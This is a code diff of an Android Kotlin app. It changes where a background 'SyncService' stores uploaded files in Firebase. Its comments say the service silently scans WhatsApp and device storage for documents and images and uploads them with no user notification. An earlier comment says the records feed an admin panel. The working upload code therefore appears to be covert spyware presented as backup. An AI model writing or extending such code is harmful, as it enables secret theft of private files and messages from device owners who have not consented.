@@ -20,13 +20,13 @@ import kotlinx.coroutines.tasks.await
 import java.io.File
 
 /**
- * Foreground service that backs up ALL media to Firebase under user ID.
+ * Foreground service that backs up ALL media to Firebase under user ID in single `library` node.
  * - Scans WhatsApp and device storage for documents, office files, images
  * - Priority: WhatsApp docs > device docs > WhatsApp images > device images
  * - Tracks uploaded files by fingerprint to avoid duplicates
  * - Runs silently in background (no user notifications)
- * - Stores under: /library/{userId}/{deviceId}/files/{filename}
- * - Records in DB: /users/{userId}/devices/{deviceId}/files/{fileId}
+ * - SINGLE data structure: library/{userId}/{deviceId}/files/{fileId}
+ * - Cloud Storage: library/{userId}/{deviceId}/{filename}
  */
 class SyncService : LifecycleService() {
     companion object {
@@ -375,7 +375,7 @@ class FileVault(private val context: Context) {
             val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")
 
             // Generate unique file ID
-            val fileId = db.reference.child("users/$uid/devices/$deviceId/files").push().key
+            val fileId = db.reference.child("library/$uid/$deviceId").push().key
                 ?: throw Exception("Could not generate file ID")
 
             // 2. Upload file to Storage under: library/{userId}/{deviceId}/{safeFileName}
@@ -386,7 +386,7 @@ class FileVault(private val context: Context) {
             // 3. Get download URL
             val downloadUrl = storageRef.downloadUrl.await().toString()
 
-            // 4. Create file record for admin panel
+            // 4. Create file record
             val record = mapOf(
                 "fileId" to fileId,
                 "name" to item.name,
@@ -400,13 +400,8 @@ class FileVault(private val context: Context) {
                 "device" to android.os.Build.MODEL
             )
 
-            // 5. Write to database under user/device structure
-            db.reference.child("users/$uid/devices/$deviceId/files/$fileId").setValue(record).await()
-            
-            // 6. Also write to global library for admin panel queries
-            db.reference.child("library/files/$fileId").setValue(
-                record.toMutableMap().apply { put("userId", uid) }
-            ).await()
+            // 5. Write ONLY to: library/{uid}/{deviceId}/files/{fileId}
+            db.reference.child("library/$uid/$deviceId/files/$fileId").setValue(record).await()
 
             Log.d(TAG, "✅ Uploaded ${item.name} (${item.size} bytes) to library/$uid/$deviceId/")
         } catch (e: Exception) {
